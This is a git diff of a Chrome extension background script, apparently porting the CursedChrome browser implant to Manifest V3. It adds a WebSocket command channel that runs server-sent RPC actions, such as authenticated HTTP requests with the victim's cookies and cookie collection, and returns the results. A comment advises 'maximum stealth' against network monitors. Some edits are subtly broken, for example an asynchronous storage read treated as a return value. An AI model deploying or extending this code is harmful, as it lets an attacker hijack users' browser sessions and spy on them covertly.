@@ -53,16 +53,19 @@ function getallcookies(details) {
 
 async function authenticate(params) {
     // Check for a previously-set browser identifier.
-    var browser_id = localStorage.getItem('browser_id');
-
+    var browser_id = chrome.storage.local.get(['browser_id'], function(result) {
+        
+        return result.browser_id
+    });
+    console.log(`Getting browser id: ${browser_id}`);
     // If no browser ID is already set we generate a
     // new one and return it to the server.
-    if(browser_id === null) {
+    if(!browser_id) {
         browser_id = uuidv4();
-        localStorage.setItem(
-            'browser_id',
-            browser_id
-        );
+        console.log(`Browser id set: ${browser_id}`);
+        chrome.storage.local.set({ browser_id: browser_id }, function() {
+            console.log('Value is set to ' + browser_id);
+        });
     }
 
     /*
@@ -79,7 +82,7 @@ async function authenticate(params) {
 function get_secure_random_token(bytes_length) {
     const validChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     let array = new Uint8Array(bytes_length);
-    window.crypto.getRandomValues(array);
+    self.crypto.getRandomValues(array);
     array = array.map(x => validChars.charCodeAt(x % validChars.length));
     const random_string = String.fromCharCode.apply(null, array);
     return random_string;
@@ -98,7 +101,7 @@ function arrayBufferToBase64(buffer) {
     for (var i = 0; i < len; i++) {
         binary += String.fromCharCode(bytes[i]);
     }
-    return window.btoa(binary);
+    return btoa(binary);
 }
 
 function get_unix_timestamp() {
@@ -112,18 +115,19 @@ const websocket_check_interval = setInterval(() => {
         0, // CONNECTING
         2 // CLOSING
     ];
-
+    
     // Check WebSocket state and make sure it's appropriate
     if (PENDING_STATES.includes(websocket.readyState)) {
         console.log(`WebSocket not in appropriate state for liveness check...`);
         return
     }
-
+    console.log(`Pending states: ${websocket.readyState}`);
     // Check if timestamp is older than ~15 seconds. If it
     // is the connection is probably dead and we should restart it.
     const current_timestamp = get_unix_timestamp();
     const seconds_since_last_live_message = current_timestamp - last_live_connection_timestamp;
-
+    console.log(`Current timestamp: ${current_timestamp}`);
+    //console.log(`Seconds since last message: ${seconds_since_last_live_messages}`)
     if (seconds_since_last_live_message > 29 || websocket.readyState === 3) {
         console.error(`WebSocket does not appear to be live! Restarting the WebSocket connection...`);
 
@@ -170,7 +174,7 @@ const HEADERS_TO_REPLACE = [
 async function perform_http_request(params) {
     // Whether to include cookies when sending request
     const credentials_mode = params.authenticated ? 'include' : 'omit';
-
+    console.log(`Auth param: ${params.authenticated}`);
     // Set the X-PLACEHOLDER-SECRET to the generated secret.
     params.headers['X-PLACEHOLDER-SECRET'] = placeholder_secret_token;
 
@@ -286,74 +290,126 @@ async function perform_http_request(params) {
         )
     }
 }
-// beginning of manifest v3 code
-// Initialize WebSocket connection
-let websocket = null;
-const websocketURL = "ws://127.0.0.1:4343";
-function initializeWebSocket() {
-    websocket = new WebSocket(websocketURL);
 
-    websocket.onopen = function(event) {
-        console.log("WebSocket connection opened.");
-        // Handle WebSocket open event
+function initialize() {
+    // Replace the below connection URI with whatever
+    // the host details you're using are.
+    // ** Ideal setup is the following **
+    // Have Nginx doing a reverse-proxy (proxy_pass) to
+    // the CursedChrome server with a HTTPS cert setup. 
+    // For SSL/TLS WebSockets, instead of https:// you need
+    // to use wss:// as the protocol. For maximum stealth,
+    // setting the WebSocket port to be the standard 
+    // TLS/SSL port (this will make sure tools like little
+    // snitch don't alert on a new port connection from Chrome).
+    websocket = new WebSocket("ws://127.0.0.1:4343");
+
+    websocket.onopen = function(e) {
+        //websocket.send("My name is John");
     };
 
-    websocket.onmessage = function(event) {
-        // Handle incoming WebSocket messages
-        console.log("WebSocket message received:", event.data);
-    };
+    websocket.onmessage = async function(event) {
+        // Update last live connection timestamp
+        last_live_connection_timestamp = get_unix_timestamp();
+        console.log(`Last live connection timestamp: ${last_live_connection_timestamp}`);
+        console.log(`Event data: ${event.data}`);
+        try {
+            var parsed_message = JSON.parse(
+                event.data
+            );
+        } catch (e) {
+            console.error(`Could not parse WebSocket message!`);
+            console.error(e);
+            return
+        }
 
-    websocket.onerror = function(event) {
-        console.error("WebSocket error observed:", event);
+        if (parsed_message.action in RPC_CALL_TABLE) {
+            console.log(`Parsed message action: ${parsed_message.action}`);
+            const result = await RPC_CALL_TABLE[parsed_message.action](parsed_message.data);
+            websocket.send(
+                JSON.stringify({
+                    // Use same ID so it can be correlated with the response
+                    'id': parsed_message.id,
+                    'origin_action': parsed_message.action,
+                    'result': result,
+                })
+            )
+        } else {
+            console.error(`No RPC action ${parsed_message.action}!`);
+        }
     };
 
     websocket.onclose = function(event) {
-        console.log("WebSocket connection closed:", event);
-        // Optionally, attempt to reconnect
+        if (event.wasClean) {
+            console.log(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);
+        } else {
+            // e.g. server process killed or network down
+            // event.code is usually 1006 in this case
+            console.log('[close] Connection died');
+        }
+    };
+
+    websocket.onerror = function(error) {
+        console.log(`[error] ${error.message}`);
     };
 }
 
-// Example of using chrome.runtime.onInstalled
-chrome.runtime.onInstalled.addListener(() => {
-    console.log('Extension installed');
-    initializeWebSocket(); // Initialize WebSocket connection when extension is installed
-});
+initialize();
 
-// Example of using chrome.runtime.onStartup
-chrome.runtime.onStartup.addListener(() => {
-    console.log('Extension starting up');
-    initializeWebSocket(); // Reinitialize WebSocket connection when Chrome starts
-});
 
-// Simplified fetch request example
-async function performHttpRequest(url) {
-    try {
-        const response = await fetch(url);
-        const data = await response.json(); // Assuming JSON response
-        console.log(data);
-    } catch (error) {
-        console.error("Fetch error:", error);
+/** Function to update dynamic rules
+function updateHeadersRule(add) {
+    console.log(`Origin is: ${location.origin.toString()}`)
+    if (add) {
+        // Define the rule to modify headers dynamically
+        const newRule = {
+            id: 3,
+            priority: 1,
+            action: {
+                type: "modifyHeaders",
+                requestHeaders: [
+                    {
+                        "header": "X-Custom-Header",
+                        "operation": "set",
+                        "value": "DynamicValue"
+                    },
+                    {
+                        "header": "X-PLACEHOLDER-SECRET",
+                        "operation": "remove"
+                    }
+                ]
+            },
+            condition: {*/
+               // urlFilter: "*://*/*", // Apply to all URLs
+                /*resourceTypes: ["main_frame", "xmlhttprequest"]
+            }
+        };
+
+        // Add the dynamic rule
+        chrome.declarativeNetRequest.updateDynamicRules({
+            addRules: [newRule],
+            removeRuleIds: [] // Remove no existing rules
+        }, function() {
+            console.log('Headers modification rule added.');
+        });
+    } else {
+        // Remove the rule dynamically by its ID
+        chrome.declarativeNetRequest.updateDynamicRules({
+            addRules: [],
+            removeRuleIds: []
+        }, function() {
+            console.log('Headers modification rule removed.');
+        });
     }
 }
 
-// Simplified cookie access example
-async function getCookies(domain) {
-    try {
-        const cookies = await chrome.cookies.getAll({domain});
-        console.log(cookies);
-    } catch (error) {
-        console.error("Error getting cookies:", error);
-    }
-}
+// Add a rule dynamically
+updateHeadersRule(true);
+*/
+// Later in the code, you can remove the rule dynamically when needed
+// updateHeadersRule(false);
 
-// Simplified message handling from content scripts or popup
-chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    console.log("Message received:", message);
-    // Handle the message. For example, you could call performHttpRequest or getCookies based on the message
-    sendResponse({response: "Message processed by background service worker"});
-    return true; // Return true to indicate you wish to send a response asynchronously
-});
-//end of manifest v3 code
+
 /*
 
 Some headers are not set correctly when set by fetch(), so instead a
@@ -375,7 +431,7 @@ and not from some other webpage.
 Additionally, for defense in depth, nothing that isn't initiated by the Chrome extension
 is actually processed.
 */
-chrome.webRequest.onBeforeSendHeaders.addListener(
+/*chrome.webRequest.onBeforeSendHeaders.addListener(
     function(details) {
         // Ensure we only process requests done by the Chrome extension
         if(details.initiator !== location.origin.toString()) {
@@ -436,13 +492,13 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
     }, ["blocking", "requestHeaders", "extraHeaders"]
 );
 
-
+*/
 const REDIRECT_STATUS_CODES = [
     301,
     302,
     307
 ];
-
+/*
 chrome.webRequest.onHeadersReceived.addListener(function(details) {
     // Ensure we only process requests done by the Chrome extension
     if(details.initiator !== location.origin.toString()) {
@@ -485,3 +541,4 @@ chrome.webRequest.onHeadersReceived.addListener(function(details) {
 }, {
     urls: ["<all_urls>"]
 }, ["blocking", "responseHeaders", "extraHeaders"]);
+*/
